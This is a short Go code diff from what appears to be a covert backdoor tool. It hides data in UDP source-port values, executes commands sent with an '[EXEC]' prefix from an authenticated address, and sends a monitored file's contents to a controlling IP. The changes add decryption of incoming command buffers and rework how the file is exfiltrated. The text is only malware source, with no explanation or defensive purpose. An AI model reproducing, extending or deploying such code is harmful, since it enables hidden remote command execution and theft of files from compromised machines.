@@ -175,7 +175,8 @@ func beginListen(ip string, port, lport uint16) {
 				err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
 				checkError(err)
 			} else if incomingIP == ip && uint16(udpLayer.DstPort) == SND_CMPLETE {
-				fmt.Print(buffer)
+				data := decrypt_data(buffer.Bytes())
+				fmt.Print(data)
 				buffer.Reset()
 			}
 		} else {
@@ -183,7 +184,7 @@ func beginListen(ip string, port, lport uint16) {
 				err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
 				checkError(err)
 			} else if incomingIP == authenticatedAddr && uint16(udpLayer.DstPort) == SND_CMPLETE {
-				strData := buffer.String()
+				strData := string(decrypt_data(buffer.Bytes()))
 				if strings.HasPrefix(strData, "[EXEC]") {
 					executeCommand(strData, incomingIP, port);
 				}
@@ -266,12 +267,8 @@ func monitorFile(ip, filename string, port uint16){
 
 			file, err := ioutil.ReadFile(filename)
 			checkError(err)
-
-			data := encrypt_data(file)
 			
-			fmt.Println(string(data))
-			
-			sendEncryptedData(port, string(data), ip, FTRANSFER)
+			sendEncryptedData(port, string(file), ip, FTRANSFER)
 			return
 		}
 	}
